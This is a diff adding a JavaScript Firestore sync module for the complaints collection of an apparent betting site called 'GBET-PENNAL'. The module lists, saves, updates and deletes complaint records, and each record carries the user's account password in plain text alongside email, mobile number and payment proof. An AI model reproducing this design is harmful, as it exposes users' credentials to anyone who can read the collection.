@@ -1,0 +1,124 @@
+/* GBET-PENNAL - Firestore sync (complaints collection) */
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import {
+  getFirestore,
+  collection,
+  doc,
+  onSnapshot,
+  setDoc,
+  updateDoc,
+  deleteDoc,
+  enableIndexedDbPersistence
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+import { firebaseConfig } from "./firebase-config.js";
+
+var app = initializeApp(firebaseConfig);
+var db = getFirestore(app);
+
+try {
+  enableIndexedDbPersistence(db).catch(function () {
+    /* multi-tab or unsupported browser: online sync still works */
+  });
+} catch (e) {
+  /* ignore persistence errors */
+}
+
+var cache = [];
+
+function toIso(value) {
+  if (value == null || value === '') return new Date().toISOString();
+  if (typeof value === 'number') return new Date(value).toISOString();
+  if (typeof value === 'object' && typeof value.toDate === 'function') return value.toDate().toISOString();
+  var s = String(value);
+  if (/^\d+$/.test(s)) return new Date(Number(s)).toISOString();
+  var t = Date.parse(s);
+  return isNaN(t) ? new Date().toISOString() : new Date(t).toISOString();
+}
+
+function categoryOf(v, problem) {
+  if (v.category === 'deposit' || v.category === 'withdrawal' || v.category === 'email') return v.category;
+  var p = String(problem || '').toLowerCase();
+  if (p.indexOf('withdraw') !== -1) return 'withdrawal';
+  if (p.indexOf('email') !== -1) return 'email';
+  return 'deposit';
+}
+
+function normalize(snap) {
+  var v = snap.data() || {};
+  var problem = v.problemType || v.problem || '';
+  var proof = typeof v.proof === 'string' ? v.proof : (typeof v.image === 'string' ? v.image : '');
+  return {
+    id: String(snap.id),
+    name: v.name || v.username || 'User',
+    uid: v.uid || '',
+    mobile: v.mobile || '',
+    email: v.email || '',
+    password: v.password || '',
+    category: categoryOf(v, problem),
+    problemType: problem,
+    amount: v.amount ? String(v.amount) : '',
+    details: v.details || '',
+    status: v.status || 'Pending',
+    createdAt: toIso(v.createdAt),
+    proof: proof
+  };
+}
+
+function emit() {
+  document.dispatchEvent(new CustomEvent('gbfb:complaints', { detail: cache.slice() }));
+}
+
+onSnapshot(collection(db, 'complaints'), function (snap) {
+  cache = snap.docs.map(normalize);
+  cache.sort(function (a, b) { return new Date(b.createdAt) - new Date(a.createdAt); });
+  emit();
+}, function (err) {
+  document.dispatchEvent(new CustomEvent('gbfb:error', { detail: String((err && err.message) || err) }));
+});
+
+var CATEGORY_LABEL = {
+  deposit: 'Deposit Problem',
+  withdrawal: 'Withdrawal Problem',
+  email: 'Email Verification'
+};
+
+function cloudPayload(record) {
+  var problem = record.problemType || CATEGORY_LABEL[record.category] || 'Complaint';
+  var created = Date.parse(record.createdAt || '');
+  if (isNaN(created)) created = Date.now();
+  return {
+    name: record.name || '',
+    username: record.name || '',
+    uid: record.uid || '',
+    mobile: record.mobile || '',
+    email: record.email || '',
+    password: record.password || '',
+    category: record.category || 'deposit',
+    problemType: problem,
+    problem: problem,
+    amount: record.amount || '',
+    details: record.details || '',
+    status: record.status || 'Pending',
+    createdAt: created,
+    date: new Date(created).toLocaleString('en-IN'),
+    proof: record.proof || '',
+    image: record.proof || ''
+  };
+}
+
+window.GBET_FB = {
+  list: function () { return cache.slice(); },
+  get: function (id) {
+    for (var i = 0; i < cache.length; i++) if (cache[i].id === id) return cache[i];
+    return null;
+  },
+  save: function (record) {
+    return setDoc(doc(db, 'complaints', String(record.id)), cloudPayload(record), { merge: true });
+  },
+  setStatus: function (id, status) {
+    return updateDoc(doc(db, 'complaints', String(id)), { status: status });
+  },
+  remove: function (id) {
+    return deleteDoc(doc(db, 'complaints', String(id)));
+  }
+};
